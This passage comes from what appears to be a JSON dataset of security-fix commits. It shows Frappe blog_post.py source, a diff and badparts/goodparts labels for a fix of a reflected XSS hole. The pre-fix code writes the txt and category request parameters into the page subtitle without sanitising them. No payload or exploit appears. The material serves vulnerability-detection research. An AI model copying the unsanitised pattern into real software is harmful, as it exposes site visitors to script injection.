\t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ",
                    "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"
                }
            },
            "msg": "fix(blog): Fix possible reflected XSS attack vector"
        }
    },
    "https://github.com/indictranstech/indictrans_frappe": {
        "2fa19c25066ed17478d683666895e3266936aee6": {
            "url": "https://api.github.com/repos/indictranstech/indictrans_frappe/commits/2fa19c25066ed17478d683666895e3266936aee6",
            "html_url": "https://github.com/indictranstech/indictrans_frappe/commit/2fa19c25066ed17478d683666895e3266936aee6",
            "sha": "2fa19c25066ed17478d683666895e3266936aee6",
            "keyword": "XSS fix",
            "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
            "message": "",
            "files": {
                "/frappe/website/doctype/blog_post/blog_post.py": {
                    "changes": [
                        {
                            "diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"
                            ],
                            "goodparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"
                            ]
                        },
                        {
                            "diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"
                            ],
                            "goodparts": [
                                "\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"
                            ]
                        },
                        {
                            "diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"
                            ],
                            "goodparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"
                            ]
                        }
                    ],
                    "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ",
                    "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not 